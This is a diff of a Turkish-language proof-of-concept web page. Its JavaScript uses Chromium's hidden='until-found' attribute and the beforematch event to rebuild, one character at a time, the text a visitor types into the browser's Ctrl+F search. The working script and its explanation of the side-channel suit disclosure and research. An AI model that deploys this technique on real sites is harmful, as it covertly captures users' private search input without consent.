@@ -1,83 +1,95 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="tr" dir="ltr">
 <head>
-<meta charset="utf-8">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width">
-<title>PoC: Sayfa İçi Arama (Ctrl+F) Veri Sızıntısı</title>
+<meta name="robots" content="All">
+
+<title>PoC: Ctrl+F (Sayfada Bul) Girdisinin Ele Geçirilmesi</title>
 
 <script src="https://cdn.tailwindcss.com"></script>
 
 <style>
+  .textblack { color: #000 }
   .textcenter { text-align: center }
   .textblue { color: #4169e1 }
-  p { font-family: system-ui, -apple-system, BlinkMacSystemFont }
+  .flex { display: flex }
+  p { font-family: Klee One, cursive }
 </style>
+
+<link rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
+
+<link rel="stylesheet"
+      href="https://fonts.googleapis.com/css?family=Noto+Sans+JP:400,700&display=swap">
+
+<link rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Klee+One:wght@400;600&display=swap">
 
 <script>
 let detectedSequence = "";
-const detected = new Set();
+const detected = new Set;
 let container;
 
 function cleanupOldCandidates(n) {
   container && container.querySelectorAll('p[id^="c_"]').forEach(e => {
-    const len = e.getAttribute("data-sequence").length;
-    if (len !== 1 && (len < n || n + 1 < len)) e.remove();
+    var t = e.getAttribute("data-sequence").length;
+    if (t !== 1 && (t < n || t > n + 1)) e.remove();
   });
 }
 
-function generateCandidates(prefix = "") {
-  if (!container) return;
+function generateCandidates(t = "") {
+  if (container) {
+    var n =
+      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
 
-  const charset =
-    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
+    t.length > 0 && cleanupOldCandidates(t.length);
 
-  if (prefix.length > 0) cleanupOldCandidates(prefix.length);
+    for (let e = 0; e < n.length; e++) {
+      var d = t + n[e];
+      const a = "c_" + encodeURIComponent(d);
 
-  for (let i = 0; i < charset.length; i++) {
-    const seq = prefix + charset[i];
-    const id = "c_" + encodeURIComponent(seq);
+      if (!container.querySelector("#" + CSS.escape(a))) {
+        const c = document.createElement("p");
 
-    if (container.querySelector("#" + CSS.escape(id))) continue;
+        c.hidden = "until-found";
+        c.id = a;
+        c.setAttribute("data-sequence", d);
 
-    const p = document.createElement("p");
+        d.endsWith(" ")
+          ? c.textContent = d + "\u200B"
+          : c.textContent = d;
 
-    /* 🔴 KRİTİK: attribute olarak */
-    p.setAttribute("hidden", "until-found");
+        c.style.fontSize = "1px";
+        c.style.margin = "0";
+        c.style.padding = "0";
+        c.style.lineHeight = "1px";
 
-    p.id = id;
-    p.setAttribute("data-sequence", seq);
-    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;
+        c.addEventListener("beforematch", e => {
+          var t, n;
+          var d = c.getAttribute("data-sequence");
 
-    p.style.fontSize = "1px";
-    p.style.margin = "0";
-    p.style.padding = "0";
-    p.style.lineHeight = "1px";
+          if (d.length === 1) {
+            detectedSequence = d;
+            document.getElementById("result").textContent = d;
+            detected.add(a);
+            generateCandidates(d);
+          } else if (!detected.has(a) && d.length > detectedSequence.length) {
+            detected.add(a);
+            t = "c_" + encodeURIComponent(detectedSequence);
+            n = container.querySelector("#" + CSS.escape(t));
+            if (n) {
+              n.setAttribute("hidden", "until-found");
+              detected.delete(t);
+            }
+            detectedSequence = d;
+            generateCandidates(document.getElementById("result").textContent = d);
+          }
+        });
 
-    p.addEventListener("beforematch", () => {
-      const current = p.getAttribute("data-sequence");
-
-      if (current.length === 1) {
-        detectedSequence = current;
-        document.getElementById("result").textContent = current;
-        detected.add(id);
-        generateCandidates(current);
-      } else if (!detected.has(id) && current.length > detectedSequence.length) {
-        detected.add(id);
-
-        const prevId = "c_" + encodeURIComponent(detectedSequence);
-        const prev = container.querySelector("#" + CSS.escape(prevId));
-        if (prev) {
-          prev.setAttribute("hidden", "until-found");
-          detected.delete(prevId);
-        }
-
-        detectedSequence = current;
-        document.getElementById("result").textContent = current;
-        generateCandidates(current);
+        container.appendChild(c);
       }
-    });
-
-    container.appendChild(p);
+    }
   }
 }
 
@@ -88,9 +100,8 @@ window.addEventListener("load", () => {
 </script>
 </head>
 
-<body class="bg-gray-50">
+<body>
 
-<!-- ⚠️ ÖNEMLİ: layout içinde, gizli ama render ediliyor -->
 <div id="search-candidates"
      style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
 </div>
@@ -98,50 +109,89 @@ window.addEventListener("load", () => {
 <br>
 
 <h1 class="text-3xl font-bold textcenter">
-  Ctrl+F (Sayfada Bul) Veri Sızıntısı – PoC
+  Sayfa İçi Arama (Ctrl+F) Girdisinin Ele Geçirilmesi
 </h1>
 
 <br>
 
-<div class="py-6">
-  <div class="mx-auto max-w-screen-md px-4">
+<div id="main" class="main py-6 sm:py-8 lg:py-12">
+<div class="mx-auto max-w-screen-md px-4 md:px-8">
 
-    <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
-      <div class="flex items-center gap-4">
-        <span class="text-xl text-gray-700 font-medium">
-          Algılanan Arama:
-        </span>
-        <span id="result"
-              class="text-4xl font-bold text-blue-600 font-mono"></span>
-      </div>
-
-      <p class="text-lg mt-4">
-        Tarayıcıda <strong>Ctrl + F</strong> yapın ve deneme olarak
-        <strong>beykozunsesi</strong> yazın.
-      </p>
-
-      <p class="text-sm text-gray-500 mt-2">
-        Not: Bu sayfada input, form veya klavye dinleyicisi yoktur.
-      </p>
-    </div>
-
-    <h2 class="textblue text-xl font-semibold mb-2">Bu sayfada ne oluyor?</h2>
-    <p class="text-gray-700">
-      Bu PoC, Chromium tabanlı tarayıcılarda bulunan
-      <code>hidden="until-found"</code> özelliğinin,
-      sayfa içi arama (Ctrl+F) sırasında bir
-      <strong>side-channel (yan kanal) veri sızıntısına</strong>
-      nasıl dönüştüğünü gösterir.
-    </p>
-
-    <p class="text-gray-700 mt-2">
-      Kullanıcı sadece sayfada arama yaptığını sanır; ancak tarayıcı,
-      eşleşen gizli elementleri görünür hale getirir.
-      Bu an <code>beforematch</code> olayı ile JavaScript tarafından
-      algılanabilir ve aranan kelime <strong>harf harf</strong> çözülebilir.
-    </p>
-
+<div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
+  <div class="flex items-center gap-4">
+    <span class="text-xl text-gray-700 font-medium">Algılanan Arama:</span>
+    <span id="result"
+          class="text-4xl font-bold text-blue-600 font-mono"></span>
   </div>
+
+  <p class="text-lg mt-4">
+    Tarayıcının <strong>Ctrl+F (Sayfada Bul)</strong> özelliğini kullanarak
+    örnek olarak <strong>“a1b2c3”</strong> aratmayı deneyin.
+  </p>
+</div>
+
+<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
+  Genel Bakış
+</h1>
+
+<p class="mb-6 sm:text-lg md:mb-8">
+  Chromium tabanlı tarayıcılarda, sadece sayfa içi aramada eşleştiğinde
+  görünür olan <code>hidden="until-found"</code> adlı özel bir HTML niteliği
+  bulunmaktadır.
+  Bu PoC, her karakter için gizli elementler oluşturarak kullanıcının
+  Ctrl+F sırasında yazdığı metni adım adım çözümleyebilir.
+</p>
+
+<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
+  Elementler Nerede Saklanıyor?
+</h1>
+
+<p class="mb-6 sm:text-lg md:mb-8">
+  Bu teknik çok sayıda HTML elementi gerektirir.
+  Tüm bu elementler 1x1 boyutunda, kullanıcıdan tamamen gizli bir
+  konteyner içerisinde tutulur.
+</p>
+
+<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
+  Boşluk Karakteri Nasıl Algılanıyor?
+</h1>
+
+<p class="mb-6 sm:text-lg md:mb-8">
+  HTML içerisinde boşluk karakterleri tek başına indekslenmediği için,
+  boşluk karakterinin arkasına görünmez bir
+  <strong>zero-width space (\u200B)</strong> eklenir.
+  Böylece Ctrl+F boşlukları da algılayabilir.
+</p>
+
+<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
+  Silme (Backspace) Algılama
+</h1>
+
+<p class="mb-6 sm:text-lg md:mb-8">
+  <del>
+    Silme işlemi algılanmaya çalışıldı ancak tarayıcı davranışları
+    tutarsız olduğu için güvenilir sonuç alınamadı.
+  </del>
+  Şu anki sürümde, tüm tek karakterli adaylar saklanarak,
+  kullanıcı yeni bir arama başlattığında tekrar algılama yapılabiliyor.
+</p>
+
+<h1 class="textblue mb-2 text-xl font-semibold sm:text-2xl md:mb-4">
+  Teşekkür
+</h1>
+
+<p class="mb-6 sm:text-lg md:mb-8">
+  <code>hidden="until-found"</code> özelliği aşağıdaki yazı sayesinde
+  keşfedilmiştir. Bu PoC, o çalışmayı genişleterek
+  tam metin elde etmeye olanak tanır.
+  <br><br>
+  <a href="https://techracho.bpsinc.jp/baba/2026_01_14/155955" target="_blank">
+    Sayfa içi arama metni site sahibine görünebilir mi? – TechRacho
+  </a>
+</p>
+
+
+</div>
 </div>
 
 </body>
